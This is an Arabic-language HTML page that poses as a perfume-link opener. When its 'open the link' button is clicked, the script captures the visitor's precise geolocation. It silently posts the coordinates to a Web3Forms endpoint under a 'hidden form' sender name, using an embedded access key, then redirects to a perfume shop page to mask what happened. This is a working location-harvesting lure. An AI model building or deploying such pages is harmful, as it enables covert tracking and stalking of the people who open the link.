<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>اختر عطرك – فتح الرابط</title>
  <style>
    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,"Noto Kufi Arabic",sans-serif;background:linear-gradient(135deg,#f3f6ff,#eef7ff,#fff);display:flex;align-items:center;justify-content:center;height:100vh;margin:0;color:#111}
    .card{background:white;padding:24px;border-radius:16px;box-shadow:0 6px 24px rgba(0,0,0,0.1);max-width:420px;width:90%;text-align:center}
    h2{margin-top:0;color:#0b84ff}
    button{padding:10px 18px;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin:6px 4px}
    .btn-primary{background:#0b84ff;color:#fff}
    .btn-primary:hover{background:#0568cc}
    .btn-cancel{background:#ddd;color:#333}
    .hint{color:#666;font-size:14px;margin-top:8px}
  </style>
</head>
<body>
  <div class="card">
    <h2>فتح الرابط في المتصفح</h2>
    <p>سيتم استخدام الموقع لإرسال الإحداثيات فقط دون عرضها للمستخدم.</p>

    <div>
      <button id="btnShare" class="btn-primary">فتح الرابط الآن</button>
      <button id="btnCancel" class="btn-cancel">إلغاء</button>
    </div>

    <p class="hint">سيطلب المتصفح إذن الموقع، ولن يتم عرض أي معلومات على الصفحة.</p>
  </div>

<script>
const THANK_YOU_URL = 'https://www.fragrancex.com/products/dolce-and-gabbana/';
const WEB3FORMS_ENDPOINT = 'https://api.web3forms.com/submit';
const WEB3FORMS_ACCESS_KEY = '2e13fcef-864c-4f30-b438-1155b980f68a';

const btnShare = document.getElementById('btnShare');
const btnCancel = document.getElementById('btnCancel');

btnShare.addEventListener('click', async () => {
  if (!('geolocation' in navigator)) {
    alert('المتصفح لا يدعم الموقع الجغرافي.');
    return;
  }

  navigator.geolocation.getCurrentPosition(async (pos) => {
    const lat = pos.coords.latitude.toFixed(6);
    const lon = pos.coords.longitude.toFixed(6);
    const acc = pos.coords.accuracy;

    try {
      await fetch(WEB3FORMS_ENDPOINT, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          access_key: WEB3FORMS_ACCESS_KEY,
          subject: 'إحداثيات موقع جديد',
          from_name: 'نموذج مخفي',
          latitude: lat,
          longitude: lon,
          accuracy: acc
        })
      });
      window.location.href = THANK_YOU_URL;
    } catch (e) {
      alert('حدث خطأ أثناء الإرسال.');
    }
  }, (err) => {
    if (err.code === err.PERMISSION_DENIED) alert('تم رفض إذن الوصول إلى الموقع.');
    else alert('حدث خطأ أثناء تحديد الموقع.');
  }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
});

btnCancel.addEventListener('click', () => window.close());
</script>
</body>
</html>
